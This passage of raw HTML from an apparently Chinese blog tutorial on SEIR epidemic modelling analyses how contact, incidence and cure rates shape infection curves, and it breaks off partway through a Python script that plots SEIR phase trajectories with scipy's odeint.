class=\"vlist-r\"><span class=\"vlist\" style=\"height: 0.15em;\"><span class=\"\"></span></span></span></span></span></span><span class=\"mspace\" style=\"margin-right: 0.277778em;\"></span><span class=\"mrel\">=</span><span class=\"mspace\" style=\"margin-right: 0.277778em;\"></span></span><span class=\"base\"><span class=\"strut\" style=\"height: 0.83888em; vertical-align: -0.19444em;\"></span><span class=\"mord\">0</span><span class=\"mord\">.</span><span class=\"mord\">0</span><span class=\"mord\">0</span><span class=\"mord\">2</span><span class=\"mpunct\">,</span><span class=\"mspace\" style=\"margin-right: 0.166667em;\"></span><span class=\"mord\"><span class=\"mord mathdefault\">s</span><span class=\"msupsub\"><span class=\"vlist-t vlist-t2\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height: 0.301108em;\"><span class=\"\" style=\"top: -2.55em; margin-left: 0em; margin-right: 0.05em;\"><span class=\"pstrut\" style=\"height: 2.7em;\"></span><span class=\"sizing reset-size6 size3 mtight\"><span class=\"mord mtight\">0</span></span></span></span><span class=\"vlist-s\">​</span></span><span class=\"vlist-r\"><span class=\"vlist\" style=\"height: 0.15em;\"><span class=\"\"></span></span></span></span></span></span><span class=\"mspace\" style=\"margin-right: 0.277778em;\"></span><span class=\"mrel\">=</span><span class=\"mspace\" style=\"margin-right: 0.277778em;\"></span></span><span class=\"base\"><span class=\"strut\" style=\"height: 1em; vertical-align: -0.25em;\"></span><span class=\"mord\">0</span><span class=\"mord\">.</span><span class=\"mord\">9</span><span class=\"mord\">9</span><span class=\"mord\">7</span><span class=\"mclose\">)</span></span></span></span></span> 不变，$\\lambda = [0.12, 0.25, 0.5, 1.0, 2.0] $ 时 <span class=\"katex--inline\"><span class=\"katex\"><span class=\"katex-mathml\"> i ( t ) , s ( t ) i(t), s(t) </span><span class=\"katex-html\"><span class=\"base\"><span class=\"strut\" style=\"height: 1em; vertical-align: -0.25em;\"></span><span class=\"mord mathdefault\">i</span><span class=\"mopen\">(</span><span class=\"mord mathdefault\">t</span><span class=\"mclose\">)</span><span class=\"mpunct\">,</span><span class=\"mspace\" style=\"margin-right: 0.166667em;\"></span><span class=\"mord mathdefault\">s</span><span class=\"mopen\">(</span><span class=\"mord mathdefault\">t</span><span class=\"mclose\">)</span></span></span></span></span> 的变化曲线如下图所示。<br> <img src=\"https://img-blog.csdnimg.cn/20210615201139776.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3lvdWNhbnM=,size_16,color_FFFFFF,t_70#pic_center\" alt=\"在这里插入图片描述\"><br> 通过对于该条件下日接触率的单因素分析，可以看到随着日接触率 <span class=\"katex--inline\"><span class=\"katex\"><span class=\"katex-mathml\"> λ \\lambda </span><span class=\"katex-html\"><span class=\"base\"><span class=\"strut\" style=\"height: 0.69444em; vertical-align: 0em;\"></span><span class=\"mord mathdefault\">λ</span></span></span></span></span> 的增大，患病率比例 <span class=\"katex--inline\"><span class=\"katex\"><span class=\"katex-mathml\"> i ( t ) i(t) </span><span class=\"katex-html\"><span class=\"base\"><span class=\"strut\" style=\"height: 1em; vertical-align: -0.25em;\"></span><span class=\"mord mathdefault\">i</span><span class=\"mopen\">(</span><span class=\"mord mathdefault\">t</span><span class=\"mclose\">)</span></span></span></span></span> 出现的峰值更早、更强，而易感者比例 <span class=\"katex--inline\"><span class=\"katex\"><span class=\"katex-mathml\"> s ( t ) s(t) </span><span class=\"katex-html\"><span class=\"base\"><span class=\"strut\" style=\"height: 1em; vertical-align: -0.25em;\"></span><span class=\"mord mathdefault\">s</span><span class=\"mopen\">(</span><span class=\"mord mathdefault\">t</span><span class=\"mclose\">)</span></span></span></span></span> 逐渐降低，但最终都趋于稳定。</p> \n <br> \n <h3><a id=\"33__delta__259\"></a>3.3 日发病率 <span class=\"katex--inline\"><span class=\"katex\"><span class=\"katex-mathml\"> δ \\delta </span><span class=\"katex-html\"><span class=\"base\"><span class=\"strut\" style=\"height: 0.69444em; vertical-align: 0em;\"></span><span class=\"mord mathdefault\" style=\"margin-right: 0.03785em;\">δ</span></span></span></span></span> 的影响</h3> \n <p>下面考察日发病率 <span class=\"katex--inline\"><span class=\"katex\"><span class=\"katex-mathml\"> δ \\delta </span><span class=\"katex-html\"><span class=\"base\"><span class=\"strut\" style=\"height: 0.69444em; vertical-align: 0em;\"></span><span class=\"mord mathdefault\" style=\"margin-right: 0.03785em;\">δ</span></span></span></span></span> 的影响。保持参数 <span class=\"katex--inline\"><span class=\"katex\"><span class=\"katex-mathml\"> λ = 0.25 ， μ = 0.06 , ( i 0 = 0.001 , e 0 = 0.002 , s 0 = 0.997 ) \\lambda =0.25，\\mu=0.06, (i_0=0.001,e_0=0.002,s_0=0.997) </span><span class=\"katex-html\"><span class=\"base\"><span class=\"strut\" style=\"height: 0.69444em; vertical-align: 0em;\"></span><span class=\"mord mathdefault\">λ</span><span class=\"mspace\" style=\"margin-right: 0.277778em;\"></span><span class=\"mrel\">=</span><span class=\"mspace\" style=\"margin-right: 0.277778em;\"></span></span><span class=\"base\"><span class=\"strut\" style=\"height: 0.83888em; vertical-align: -0.19444em;\"></span><span class=\"mord\">0</span><span class=\"mord\">.</span><span class=\"mord\">2</span><span class=\"mord\">5</span><span class=\"mord cjk_fallback\">，</span><span class=\"mord mathdefault\">μ</span><span class=\"mspace\" style=\"margin-right: 0.277778em;\"></span><span class=\"mrel\">=</span><span class=\"mspace\" style=\"margin-right: 0.277778em;\"></span></span><span class=\"base\"><span class=\"strut\" style=\"height: 1em; vertical-align: -0.25em;\"></span><span class=\"mord\">0</span><span class=\"mord\">.</span><span class=\"mord\">0</span><span class=\"mord\">6</span><span class=\"mpunct\">,</span><span class=\"mspace\" style=\"margin-right: 0.166667em;\"></span><span class=\"mopen\">(</span><span class=\"mord\"><span class=\"mord mathdefault\">i</span><span class=\"msupsub\"><span class=\"vlist-t vlist-t2\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height: 0.301108em;\"><span class=\"\" style=\"top: -2.55em; margin-left: 0em; margin-right: 0.05em;\"><span class=\"pstrut\" style=\"height: 2.7em;\"></span><span class=\"sizing reset-size6 size3 mtight\"><span class=\"mord mtight\">0</span></span></span></span><span class=\"vlist-s\">​</span></span><span class=\"vlist-r\"><span class=\"vlist\" style=\"height: 0.15em;\"><span class=\"\"></span></span></span></span></span></span><span class=\"mspace\" style=\"margin-right: 0.277778em;\"></span><span class=\"mrel\">=</span><span class=\"mspace\" style=\"margin-right: 0.277778em;\"></span></span><span class=\"base\"><span class=\"strut\" style=\"height: 0.83888em; vertical-align: -0.19444em;\"></span><span class=\"mord\">0</span><span class=\"mord\">.</span><span class=\"mord\">0</span><span class=\"mord\">0</span><span class=\"mord\">1</span><span class=\"mpunct\">,</span><span class=\"mspace\" style=\"margin-right: 0.166667em;\"></span><span class=\"mord\"><span class=\"mord mathdefault\">e</span><span class=\"msupsub\"><span class=\"vlist-t vlist-t2\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height: 0.301108em;\"><span class=\"\" style=\"top: -2.55em; margin-left: 0em; margin-right: 0.05em;\"><span class=\"pstrut\" style=\"height: 2.7em;\"></span><span class=\"sizing reset-size6 size3 mtight\"><span class=\"mord mtight\">0</span></span></span></span><span class=\"vlist-s\">​</span></span><span class=\"vlist-r\"><span class=\"vlist\" style=\"height: 0.15em;\"><span class=\"\"></span></span></span></span></span></span><span class=\"mspace\" style=\"margin-right: 0.277778em;\"></span><span class=\"mrel\">=</span><span class=\"mspace\" style=\"margin-right: 0.277778em;\"></span></span><span class=\"base\"><span class=\"strut\" style=\"height: 0.83888em; vertical-align: -0.19444em;\"></span><span class=\"mord\">0</span><span class=\"mord\">.</span><span class=\"mord\">0</span><span class=\"mord\">0</span><span class=\"mord\">2</span><span class=\"mpunct\">,</span><span class=\"mspace\" style=\"margin-right: 0.166667em;\"></span><span class=\"mord\"><span class=\"mord mathdefault\">s</span><span class=\"msupsub\"><span class=\"vlist-t vlist-t2\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height: 0.301108em;\"><span class=\"\" style=\"top: -2.55em; margin-left: 0em; margin-right: 0.05em;\"><span class=\"pstrut\" style=\"height: 2.7em;\"></span><span class=\"sizing reset-size6 size3 mtight\"><span class=\"mord mtight\">0</span></span></span></span><span class=\"vlist-s\">​</span></span><span class=\"vlist-r\"><span class=\"vlist\" style=\"height: 0.15em;\"><span class=\"\"></span></span></span></span></span></span><span class=\"mspace\" style=\"margin-right: 0.277778em;\"></span><span class=\"mrel\">=</span><span class=\"mspace\" style=\"margin-right: 0.277778em;\"></span></span><span class=\"base\"><span class=\"strut\" style=\"height: 1em; vertical-align: -0.25em;\"></span><span class=\"mord\">0</span><span class=\"mord\">.</span><span class=\"mord\">9</span><span class=\"mord\">9</span><span class=\"mord\">7</span><span class=\"mclose\">)</span></span></span></span></span> 不变，$\\delta = [0.02, 0.05, 0.1, 0.2, 0.4] $ 时 <span class=\"katex--inline\"><span class=\"katex\"><span class=\"katex-mathml\"> i ( t ) , s ( t ) i(t), s(t) </span><span class=\"katex-html\"><span class=\"base\"><span class=\"strut\" style=\"height: 1em; vertical-align: -0.25em;\"></span><span class=\"mord mathdefault\">i</span><span class=\"mopen\">(</span><span class=\"mord mathdefault\">t</span><span class=\"mclose\">)</span><span class=\"mpunct\">,</span><span class=\"mspace\" style=\"margin-right: 0.166667em;\"></span><span class=\"mord mathdefault\">s</span><span class=\"mopen\">(</span><span class=\"mord mathdefault\">t</span><span class=\"mclose\">)</span></span></span></span></span> 的变化曲线如下图所示。<br> <img src=\"https://img-blog.csdnimg.cn/20210615201157819.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3lvdWNhbnM=,size_16,color_FFFFFF,t_70#pic_center\" alt=\"在这里插入图片描述\"></p> \n <p>通过对于该条件下日接触率的单因素分析，可以看到随着日接触率 <span class=\"katex--inline\"><span class=\"katex\"><span class=\"katex-mathml\"> λ \\lambda </span><span class=\"katex-html\"><span class=\"base\"><span class=\"strut\" style=\"height: 0.69444em; vertical-align: 0em;\"></span><span class=\"mord mathdefault\">λ</span></span></span></span></span> 的增大，患病率比例 <span class=\"katex--inline\"><span class=\"katex\"><span class=\"katex-mathml\"> i ( t ) i(t) </span><span class=\"katex-html\"><span class=\"base\"><span class=\"strut\" style=\"height: 1em; vertical-align: -0.25em;\"></span><span class=\"mord mathdefault\">i</span><span class=\"mopen\">(</span><span class=\"mord mathdefault\">t</span><span class=\"mclose\">)</span></span></span></span></span> 出现的峰值更早、更强，而易感者比例 <span class=\"katex--inline\"><span class=\"katex\"><span class=\"katex-mathml\"> s ( t ) s(t) </span><span class=\"katex-html\"><span class=\"base\"><span class=\"strut\" style=\"height: 1em; vertical-align: -0.25em;\"></span><span class=\"mord mathdefault\">s</span><span class=\"mopen\">(</span><span class=\"mord mathdefault\">t</span><span class=\"mclose\">)</span></span></span></span></span> 逐渐降低，但最终都趋于稳定。</p> \n <br> \n <h3><a id=\"34__mu__268\"></a>3.4 日治愈率 <span class=\"katex--inline\"><span class=\"katex\"><span class=\"katex-mathml\"> μ \\mu </span><span class=\"katex-html\"><span class=\"base\"><span class=\"strut\" style=\"height: 0.625em; vertical-align: -0.19444em;\"></span><span class=\"mord mathdefault\">μ</span></span></span></span></span> 的影响</h3> \n <p>下面考察日治愈率 <span class=\"katex--inline\"><span class=\"katex\"><span class=\"katex-mathml\"> μ \\mu </span><span class=\"katex-html\"><span class=\"base\"><span class=\"strut\" style=\"height: 0.625em; vertical-align: -0.19444em;\"></span><span class=\"mord mathdefault\">μ</span></span></span></span></span> 的影响。保持参数 <span class=\"katex--inline\"><span class=\"katex\"><span class=\"katex-mathml\"> λ = 0.25 ， δ = 0.1 ， ( i 0 = 0.001 , e 0 = 0.002 , s 0 = 0.997 ) \\lambda =0.25，\\delta=0.1， (i_0=0.001,e_0=0.002,s_0=0.997) </span><span class=\"katex-html\"><span class=\"base\"><span class=\"strut\" style=\"height: 0.69444em; vertical-align: 0em;\"></span><span class=\"mord mathdefault\">λ</span><span class=\"mspace\" style=\"margin-right: 0.277778em;\"></span><span class=\"mrel\">=</span><span class=\"mspace\" style=\"margin-right: 0.277778em;\"></span></span><span class=\"base\"><span class=\"strut\" style=\"height: 0.69444em; vertical-align: 0em;\"></span><span class=\"mord\">0</span><span class=\"mord\">.</span><span class=\"mord\">2</span><span class=\"mord\">5</span><span class=\"mord cjk_fallback\">，</span><span class=\"mord mathdefault\" style=\"margin-right: 0.03785em;\">δ</span><span class=\"mspace\" style=\"margin-right: 0.277778em;\"></span><span class=\"mrel\">=</span><span class=\"mspace\" style=\"margin-right: 0.277778em;\"></span></span><span class=\"base\"><span class=\"strut\" style=\"height: 1em; vertical-align: -0.25em;\"></span><span class=\"mord\">0</span><span class=\"mord\">.</span><span class=\"mord\">1</span><span class=\"mord cjk_fallback\">，</span><span class=\"mopen\">(</span><span class=\"mord\"><span class=\"mord mathdefault\">i</span><span class=\"msupsub\"><span class=\"vlist-t vlist-t2\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height: 0.301108em;\"><span class=\"\" style=\"top: -2.55em; margin-left: 0em; margin-right: 0.05em;\"><span class=\"pstrut\" style=\"height: 2.7em;\"></span><span class=\"sizing reset-size6 size3 mtight\"><span class=\"mord mtight\">0</span></span></span></span><span class=\"vlist-s\">​</span></span><span class=\"vlist-r\"><span class=\"vlist\" style=\"height: 0.15em;\"><span class=\"\"></span></span></span></span></span></span><span class=\"mspace\" style=\"margin-right: 0.277778em;\"></span><span class=\"mrel\">=</span><span class=\"mspace\" style=\"margin-right: 0.277778em;\"></span></span><span class=\"base\"><span class=\"strut\" style=\"height: 0.83888em; vertical-align: -0.19444em;\"></span><span class=\"mord\">0</span><span class=\"mord\">.</span><span class=\"mord\">0</span><span class=\"mord\">0</span><span class=\"mord\">1</span><span class=\"mpunct\">,</span><span class=\"mspace\" style=\"margin-right: 0.166667em;\"></span><span class=\"mord\"><span class=\"mord mathdefault\">e</span><span class=\"msupsub\"><span class=\"vlist-t vlist-t2\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height: 0.301108em;\"><span class=\"\" style=\"top: -2.55em; margin-left: 0em; margin-right: 0.05em;\"><span class=\"pstrut\" style=\"height: 2.7em;\"></span><span class=\"sizing reset-size6 size3 mtight\"><span class=\"mord mtight\">0</span></span></span></span><span class=\"vlist-s\">​</span></span><span class=\"vlist-r\"><span class=\"vlist\" style=\"height: 0.15em;\"><span class=\"\"></span></span></span></span></span></span><span class=\"mspace\" style=\"margin-right: 0.277778em;\"></span><span class=\"mrel\">=</span><span class=\"mspace\" style=\"margin-right: 0.277778em;\"></span></span><span class=\"base\"><span class=\"strut\" style=\"height: 0.83888em; vertical-align: -0.19444em;\"></span><span class=\"mord\">0</span><span class=\"mord\">.</span><span class=\"mord\">0</span><span class=\"mord\">0</span><span class=\"mord\">2</span><span class=\"mpunct\">,</span><span class=\"mspace\" style=\"margin-right: 0.166667em;\"></span><span class=\"mord\"><span class=\"mord mathdefault\">s</span><span class=\"msupsub\"><span class=\"vlist-t vlist-t2\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height: 0.301108em;\"><span class=\"\" style=\"top: -2.55em; margin-left: 0em; margin-right: 0.05em;\"><span class=\"pstrut\" style=\"height: 2.7em;\"></span><span class=\"sizing reset-size6 size3 mtight\"><span class=\"mord mtight\">0</span></span></span></span><span class=\"vlist-s\">​</span></span><span class=\"vlist-r\"><span class=\"vlist\" style=\"height: 0.15em;\"><span class=\"\"></span></span></span></span></span></span><span class=\"mspace\" style=\"margin-right: 0.277778em;\"></span><span class=\"mrel\">=</span><span class=\"mspace\" style=\"margin-right: 0.277778em;\"></span></span><span class=\"base\"><span class=\"strut\" style=\"height: 1em; vertical-align: -0.25em;\"></span><span class=\"mord\">0</span><span class=\"mord\">.</span><span class=\"mord\">9</span><span class=\"mord\">9</span><span class=\"mord\">7</span><span class=\"mclose\">)</span></span></span></span></span> 不变，$\\mu = [0.02, 0.05, 0.1, 0.2, 0.4] $ 时 <span class=\"katex--inline\"><span class=\"katex\"><span class=\"katex-mathml\"> i ( t ) , s ( t ) i(t), s(t) </span><span class=\"katex-html\"><span class=\"base\"><span class=\"strut\" style=\"height: 1em; vertical-align: -0.25em;\"></span><span class=\"mord mathdefault\">i</span><span class=\"mopen\">(</span><span class=\"mord mathdefault\">t</span><span class=\"mclose\">)</span><span class=\"mpunct\">,</span><span class=\"mspace\" style=\"margin-right: 0.166667em;\"></span><span class=\"mord mathdefault\">s</span><span class=\"mopen\">(</span><span class=\"mord mathdefault\">t</span><span class=\"mclose\">)</span></span></span></span></span> 的变化曲线如下图所示。<br> <img src=\"https://img-blog.csdnimg.cn/20210615201210534.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3lvdWNhbnM=,size_16,color_FFFFFF,t_70#pic_center\" alt=\"在这里插入图片描述\"></p> \n <p>通过对该条件下日治愈率的单因素分析，可以看到在日治愈率 <span class=\"katex--inline\"><span class=\"katex\"><span class=\"katex-mathml\"> μ = 0.4 \\mu=0.4 </span><span class=\"katex-html\"><span class=\"base\"><span class=\"strut\" style=\"height: 0.625em; vertical-align: -0.19444em;\"></span><span class=\"mord mathdefault\">μ</span><span class=\"mspace\" style=\"margin-right: 0.277778em;\"></span><span class=\"mrel\">=</span><span class=\"mspace\" style=\"margin-right: 0.277778em;\"></span></span><span class=\"base\"><span class=\"strut\" style=\"height: 0.64444em; vertical-align: 0em;\"></span><span class=\"mord\">0</span><span class=\"mord\">.</span><span class=\"mord\">4</span></span></span></span></span> 时，患病者比例始终非常低并趋于 0，易感者比例几乎不变，表明疫情不会传播，这是因为患病者治愈的速度快于易感者被感染的速度。</p> \n <p>在日治愈率 <span class=\"katex--inline\"><span class=\"katex\"><span class=\"katex-mathml\"> μ = 0.2 \\mu=0.2 </span><span class=\"katex-html\"><span class=\"base\"><span class=\"strut\" style=\"height: 0.625em; vertical-align: -0.19444em;\"></span><span class=\"mord mathdefault\">μ</span><span class=\"mspace\" style=\"margin-right: 0.277778em;\"></span><span class=\"mrel\">=</span><span class=\"mspace\" style=\"margin-right: 0.277778em;\"></span></span><span class=\"base\"><span class=\"strut\" style=\"height: 0.64444em; vertical-align: 0em;\"></span><span class=\"mord\">0</span><span class=\"mord\">.</span><span class=\"mord\">2</span></span></span></span></span> 时，患病者比例也始终非常低（接近 0），易感者比例缓慢降低并趋于稳定值，表明疫情的传播十分缓慢微弱，这是因为患病者治愈的速度较快，在易感者比例逐渐降低到某一水平后治愈人数与感染人数将达到平衡。</p> \n <p>在日治愈率较低时 （<span class=\"katex--inline\"><span class=\"katex\"><span class=\"katex-mathml\"> μ &lt; 0.2 \\mu&lt;0.2 </span><span class=\"katex-html\"><span class=\"base\"><span class=\"strut\" style=\"height: 0.73354em; vertical-align: -0.19444em;\"></span><span class=\"mord mathdefault\">μ</span><span class=\"mspace\" style=\"margin-right: 0.277778em;\"></span><span class=\"mrel\">&lt;</span><span class=\"mspace\" style=\"margin-right: 0.277778em;\"></span></span><span class=\"base\"><span class=\"strut\" style=\"height: 0.64444em; vertical-align: 0em;\"></span><span class=\"mord\">0</span><span class=\"mord\">.</span><span class=\"mord\">2</span></span></span></span></span> ），患病者比例曲线存在波峰，然后再逐渐减小，最终趋于 0。随着日治愈率 <span class=\"katex--inline\"><span class=\"katex\"><span class=\"katex-mathml\"> μ \\mu </span><span class=\"katex-html\"><span class=\"base\"><span class=\"strut\" style=\"height: 0.625em; vertical-align: -0.19444em;\"></span><span class=\"mord mathdefault\">μ</span></span></span></span></span> 的减小，患病率比例 <span class=\"katex--inline\"><span class=\"katex\"><span class=\"katex-mathml\"> i ( t ) i(t) </span><span class=\"katex-html\"><span class=\"base\"><span class=\"strut\" style=\"height: 1em; vertical-align: -0.25em;\"></span><span class=\"mord mathdefault\">i</span><span class=\"mopen\">(</span><span class=\"mord mathdefault\">t</span><span class=\"mclose\">)</span></span></span></span></span> 曲线的峰值更强、也稍早。易感者比例 <span class=\"katex--inline\"><span class=\"katex\"><span class=\"katex-mathml\"> s ( t ) s(t) </span><span class=\"katex-html\"><span class=\"base\"><span class=\"strut\" style=\"height: 1em; vertical-align: -0.25em;\"></span><span class=\"mord mathdefault\">s</span><span class=\"mopen\">(</span><span class=\"mord mathdefault\">t</span><span class=\"mclose\">)</span></span></span></span></span> 随着患病者比例上升而迅速降低，最终趋于某个稳定值，也达到治愈与感染的平衡。</p> \n <p>通过对不同参数的单因素实验和结果分析，可以发现虽然各个模型参数和初始条件都会影响疫情曲线，但日治愈率 与日接触率的关系更为重要。进一步的分析和模拟可以发现，传染期接触数 <span class=\"katex--inline\"><span class=\"katex\"><span class=\"katex-mathml\"> σ = λ / μ \\sigma = \\lambda / \\mu </span><span class=\"katex-html\"><span class=\"base\"><span class=\"strut\" style=\"height: 0.43056em; vertical-align: 0em;\"></span><span class=\"mord mathdefault\" style=\"margin-right: 0.03588em;\">σ</span><span class=\"mspace\" style=\"margin-right: 0.277778em;\"></span><span class=\"mrel\">=</span><span class=\"mspace\" style=\"margin-right: 0.277778em;\"></span></span><span class=\"base\"><span class=\"strut\" style=\"height: 1em; vertical-align: -0.25em;\"></span><span class=\"mord mathdefault\">λ</span><span class=\"mord\">/</span><span class=\"mord mathdefault\">μ</span></span></span></span></span>是传染病蔓延的阈值，满足 <span class=\"katex--inline\"><span class=\"katex\"><span class=\"katex-mathml\"> s 0 &gt; 1 / σ s_0&gt;1/\\sigma </span><span class=\"katex-html\"><span class=\"base\"><span class=\"strut\" style=\"height: 0.6891em; vertical-align: -0.15em;\"></span><span class=\"mord\"><span class=\"mord mathdefault\">s</span><span class=\"msupsub\"><span class=\"vlist-t vlist-t2\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height: 0.301108em;\"><span class=\"\" style=\"top: -2.55em; margin-left: 0em; margin-right: 0.05em;\"><span class=\"pstrut\" style=\"height: 2.7em;\"></span><span class=\"sizing reset-size6 size3 mtight\"><span class=\"mord mtight\">0</span></span></span></span><span class=\"vlist-s\">​</span></span><span class=\"vlist-r\"><span class=\"vlist\" style=\"height: 0.15em;\"><span class=\"\"></span></span></span></span></span></span><span class=\"mspace\" style=\"margin-right: 0.277778em;\"></span><span class=\"mrel\">&gt;</span><span class=\"mspace\" style=\"margin-right: 0.277778em;\"></span></span><span class=\"base\"><span class=\"strut\" style=\"height: 1em; vertical-align: -0.25em;\"></span><span class=\"mord\">1</span><span class=\"mord\">/</span><span class=\"mord mathdefault\" style=\"margin-right: 0.03588em;\">σ</span></span></span></span></span> 才会发生传染病蔓延。</p> \n <p>这说明具有决定性影响的特征参数，往往不是模型中的某个参数，而是多个参数特定关系的组合，仅从单因素实验很难充分反映模型中的内在特征。</p> \n <hr> \n <br> \n <h2><a id=\"4_SEIR__287\"></a>4. SEIR 模型的相空间分析</h2> \n <h3><a id=\"41_PythonSEIR__289\"></a>4.1 Python例程：SEIR 模型的相轨迹</h3> \n <pre><code class=\"prism language-python\"><span class=\"token comment\"># modelCovid4_v1.py</span>\n<span class=\"token comment\"># Demo01 of mathematical modeling for Covid2019</span>\n<span class=\"token comment\"># SIR model for epidemic diseases.</span>\n<span class=\"token comment\"># Copyright 2021 Youcans, XUPT</span>\n<span class=\"token comment\"># Crated：2021-06-15</span>\n<span class=\"token comment\"># Python小白的数学建模课 @ Youcans</span>\n\n<span class=\"token comment\"># 7. SEIR 模型，常微分方程组 相空间分析: e(t)~i(t)</span>\n<span class=\"token keyword\">from</span> scipy<span class=\"token punctuation\">.</span>integrate <span class=\"token keyword\">import</span> odeint  <span class=\"token comment\"># 导入 scipy.integrate 模块</span>\n<span class=\"token keyword\">import</span> numpy <span class=\"token keyword\">as</span> np  <span class=\"token comment\"># 导入 numpy包</span>\n<span class=\"token keyword\">import</span> matplotlib<span class=\"token punctuation\">.</span>pyplot <span class=\"token keyword\">as</span> plt  <span class=\"token comment\"># 导入 matplotlib包</span>\n\n<span class=\"token keyword\">def</span> <span class=\"token function\">dySEIR</span><span class=\"token punctuation\">(</span>y<span class=\"token punctuation\">,</span> t<span class=\"token punctuation\">,</span> lamda<span class=\"token punctuation\">,</span> delta<span class=\"token punctuation\">,</span> mu<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span>  <span class=\"token comment\"># SEIR 模型，导数函数</span>\n    s<span class=\"token punctuation\">,</span> e<span class=\"token punctuation\">,</span> i <span class=\"token operator\">=</span> y\n    ds_dt <span class=\"token operator\">=</span> <span class=\"token operator\">-</span>lamda<span class=\"token operator\">*</span>s<span class=\"token operator\">*</span>i  <span class=\"token comment\"># ds/dt = -lamda*s*i</span>\n    de_dt <span class=\"token operator\">=</span> lamda<span class=\"token operator\">*</span>s<span class=\"token operator\">*</span>i <span class=\"token operator\">-</span> delta<span class=\"token operator\">*</span>e  <span class=\"token comment\"># de/dt = lamda*s*i - delta*e</span>\n    di_dt <span class=\"token operator\">=</span> delta<span class=\"token operator\">*</span>e <span class=\"token operator\">-</span> mu<span class=\"token operator\">*</span>i  <span class=\"token comment\"># di/dt = delta*e - mu*i</span>\n    <span class=\"token keyword\">return</span> np<span class=\"token punctuation\">.</span>array<span class=\"token punctuation\">(</span><span class=\"token punctuation\">[</span>ds_dt<span class=\"token punctuation\">,</span>de_dt<span class=\"token punctuation\">,</span>di_dt<span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span>\n\n<span class=\"token comment\"># 设置模型参数</span>\nnumber <span class=\"token operator\">=</span> <span class=\"token number\">1e5</span>  <span class=\"token comment\"># 总人数</span>\nlamda <span class=\"token operator\">=</span> <span class=\"token number\">0.3</span>  <span class=\"token comment\"># 日接触率, 患病者每天有效接触的易感者的平均人数</span>\ndelta <span class=\"token operator\">=</span> <span class=\"token number\">0.1</span>  <span class=\"token comment\"># 日发病率，每天发病成为患病者的潜伏者占潜伏者总数的比例</span>\nmu <span class=\"token operator\">=</span> <span class=\"token number\">0.1</span>  <span class=\"token comment\"># 日治愈率, 每天治愈的患病者人数占患病者总数的比例</span>\nsigma <span class=\"token operator\">=</span> lamda <span class=\"token operator\">/</span> mu  <span class=\"token comment\"># 传染期接触数</span>\ntEnd <span class=\"token operator\">=</span> <span class=\"token number\">500</span>  <span class=\"token comment\"># 预测日期长度</span>\nt <span class=\"token operator\">=</span> np<span class=\"token punctuation\">.</span>arange<span class=\"token punctuation\">(</span><span class=\"token number\">0.0</span><span class=\"token punctuation\">,</span> tEnd<span class=\"token punctuation\">,</span> <span class=\"token number\">1</span><span class=\"token punctuation\">)</span>  <span class=\"token comment\"># (start,stop,step)# e0List = np.arange(0.01,0.4,0.05)  # (start,stop,step)</span>\n\ne0List <span class=\"token operator\">=</span> np<span class=\"token punctuation\">.</span>arange<span class=\"token punctuation\">(</span><span class=\"token number\">0.01</span><span class=\"token punctuation\">,</span><span class=\"token number\">0.4</span><span class=\"token punctuation\">,</span><span class=\"token number\">0.05</span><span class=\"token punctuation\">)</span>  <span class=\"token comment\"># (start,stop,step)</span>\n<span class=\"token keyword\">for</span> e0 <span class=\"token keyword\">in</span> e0List<span class=\"token punctuation\">:</span>\n    <span class=\"token comment\"># odeint 数值解，求解微分方程初值问题</span>\n    i0 <span class=\"token operator\">=</span> <span class=\"token number\">0</span>  <span class=\"token comment\"># 潜伏者比例的初值</span>\n    s0 <span class=\"token operator\">=</span> <span class=\"token number\">1</span> <span class=\"token operator\">-</span> i0 <span class=\"token operator\">-</span> e0  <span class=\"token comment\"># 易感者比例的初值</span>\n    ySEIR <span class=\"token operator\">=</span> odeint<span class=\"token punctuation\">(</span>dySEIR<span class=\"token punctuation\">,</span> <span class=\"token punctuation\">(</span>s0<span class=\"token punctuation\">,</span>e0<span class=\"token punctuation\">,</span>i0<span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span> t<span class=\"token punctuation\">,</span> args<span class=\"token operator\">=</span><span class=\"token punctuation\">(</span>lamda<span class=\"token punctuation\">,</span>delta<span class=\"token punctuation\">,</span>mu<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>  <span class=\"token comment\"># SEIR 模型</span>\n    plt<span class=\"token punctuation\">.</span>plot<span class=\"token punctuation\">(</span>ySEIR<span class=\"token punctuation\">[</span><span class=\"token punctuation\">:</span><span class=\"token punctuation\">,</span><span class=\"token number\">1</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">,</span> ySEIR<span class=\"token punctuation\">[</span><span class=\"token punctuation\">:</span><span class=\"token punctuation\">,</span><span class=\"token number\">2</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span>  <span class=\"token comment\"># (e(t),i(t))</span>\n    <span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"lamda={}\\tdelta={}\\mu={}\\tsigma={}\\ti0={}\\te0={}\"</span><span class=\"token punctuation\">.</span><span class=\"token builtin\">format</span><span class=\"token punctuation\">(</span>lamda<span class=\"token punctuation\">,</span>delta<span class=\"token punctuation\">,</span>mu<span class=\"token punctuation\">,</span>lamda<span class=\"token operator\">/</span>mu<span class=\"token punctuation\">,</span>i0<span class=\"token punctuation\">,</span>e0<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>\n\n<span class=\"token comment\"># 输出绘图</span>\nplt<span class=\"token punctuation\">.</span>title<span class=\"token punctuation\">(</span><span class=\"token string\">\"Phase trajectory of SEIR models: e(t)~i(t)\"</span><span class=\"token punctuation\">)</span>\nplt<span class=\"token punctuation\">.</span>axis<span class=\"token punctuation\">(</span><span class=\"token 